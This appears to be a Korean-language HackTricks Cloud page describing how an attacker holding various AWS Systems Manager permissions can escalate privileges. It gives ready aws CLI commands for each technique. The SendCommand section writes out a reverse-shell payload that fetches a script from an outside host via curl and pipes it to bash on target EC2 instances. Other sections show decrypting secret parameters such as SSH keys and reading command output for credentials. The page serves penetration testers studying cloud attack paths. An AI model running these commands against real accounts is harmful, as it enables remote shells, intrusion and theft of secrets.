# AWS - SSM 권한 상승

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>을 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**telegram 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## SSM

SSM에 대한 자세한 정보는 다음을 참조하세요:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `ssm:SendCommand`

**`ssm:SendCommand`** 권한을 가진 공격자는 Amazon SSM Agent가 실행되는 인스턴스에서 **명령을 실행**하고 그 안에 있는 IAM 역할을 **침해**할 수 있습니다.
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/4.tcp.ngrok.io:16084 | bash"

# If you are in the machine you can capture the reverseshel inside of it
nc -lvnp 4444 #Inside the EC2 instance
aws ssm send-command --instance-ids "$INSTANCE_ID" \
--document-name "AWS-RunShellScript" --output text \
--parameters commands="curl https://reverse-shell.sh/127.0.0.1:4444 | bash"
```
**잠재적 영향:** SSM 에이전트가 실행 중인 EC2 IAM 역할로의 직접적인 권한 상승.

### `ssm:StartSession`

**`ssm:StartSession`** 권한을 가진 공격자는 Amazon SSM 에이전트가 실행 중인 인스턴스에서 **SSH와 유사한 세션을 시작**하고 그 안에 있는 실행 중인 IAM 역할을 **침해**할 수 있습니다.
```bash
# Check for configured instances
aws ssm describe-instance-information
aws ssm describe-sessions --state Active

# Send rev shell command
aws ssm start-session --target "$INSTANCE_ID"
```
{% hint style="danger" %}
세션을 시작하려면 **SessionManagerPlugin**이 설치되어 있어야 합니다: [https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html)
{% endhint %}

**잠재적 영향:** SSM 에이전트가 실행 중인 EC2 IAM 역할에 대한 직접 권한 상승.

#### ECS로의 권한 상승

**ECS 작업**이 **`ExecuteCommand`가 활성화**된 상태로 실행될 때, 충분한 권한을 가진 사용자는 `ecs execute-command`를 사용하여 컨테이너 내에서 명령을 실행할 수 있습니다.\
[**문서**](https://aws.amazon.com/blogs/containers/new-using-amazon-ecs-exec-access-your-containers-fargate-ec2/)에 따르면, 이는 "exec" 명령을 시작하는 장치와 SSM 세션 관리자를 통해 대상 컨테이너 간에 안전한 채널을 생성하여 수행됩니다.\
따라서 `ssm:StartSession` 권한을 가진 사용자는 해당 옵션이 활성화된 ECS 작업 내에서 쉘을 얻을 수 있습니다. 다음 명령을 실행하면 됩니다:
```bash
aws ssm start-session --target "ecs:CLUSTERNAME_TASKID_RUNTIMEID"
```
![](<../../../.gitbook/assets/image (55).png>)

**잠재적 영향:** `ExecuteCommand`가 활성화된 실행 중인 작업에 연결된 `ECS` IAM 역할로의 직접적인 권한 상승.

### `ssm:ResumeSession`

**`ssm:ResumeSession`** 권한을 가진 공격자는 **Amazon SSM 에이전트가 실행 중인 인스턴스에서 SSH와 유사한 세션을 다시 시작**할 수 있으며, **끊어진** SSM 세션 상태에서 **내부에서 실행 중인 IAM 역할을 침해**할 수 있습니다.
```bash
# Check for configured instances
aws ssm describe-sessions

# Get resume data (you will probably need to do something else with this info to connect)
aws ssm resume-session \
--session-id Mary-Major-07a16060613c408b5
```
**잠재적 영향:** SSM 에이전트가 실행되고 연결이 끊긴 세션과 함께 실행 중인 EC2 IAM 역할로의 직접적인 권한 상승.

### `ssm:DescribeParameters`, (`ssm:GetParameter` | `ssm:GetParameters`)

해당 권한을 가진 공격자는 **SSM 매개변수**를 나열하고 **평문으로 읽을 수** 있게 됩니다. 이러한 매개변수에서는 SSH 키나 API 키와 같은 **민감한 정보**를 자주 찾을 수 있습니다.
```bash
aws ssm describe-parameters
# Suppose that you found a parameter called "id_rsa"
aws ssm get-parameters --names id_rsa --with-decryption
aws ssm get-parameter --name id_rsa --with-decryption
```
**잠재적 영향:** 파라미터 내에서 민감한 정보를 찾을 수 있습니다.

### `ssm:ListCommands`

이 권한을 가진 공격자는 모든 **명령어**를 나열하고, 그 중에서 **민감한 정보**를 찾을 수 있습니다.
```
aws ssm list-commands
```
**잠재적 영향:** 명령줄 내에서 민감한 정보를 찾을 수 있습니다.

### `ssm:GetCommandInvocation`, (`ssm:ListCommandInvocations` | `ssm:ListCommands`)

이 권한을 가진 공격자는 모든 전송된 **명령**을 나열하고 생성된 **출력**을 읽을 수 있으며, 이를 통해 **민감한 정보**를 발견할 수 있습니다.
```bash
# You can use any of both options to get the command-id and instance id
aws ssm list-commands
aws ssm list-command-invocations

aws ssm get-command-invocation --command-id <cmd_id> --instance-id <i_id>
```
**잠재적 영향:** 명령어 출력 내에서 민감한 정보를 찾을 수 있습니다.

### Codebuild

SSM을 사용하여 빌드 중인 codebuild 프로젝트에 접근할 수도 있습니다:

{% content-ref url="aws-codebuild-privesc.md" %}
[aws-codebuild-privesc.md](aws-codebuild-privesc.md)
{% endcontent-ref %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 **HackTricks에서 광고**하거나 **PDF로 HackTricks를 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
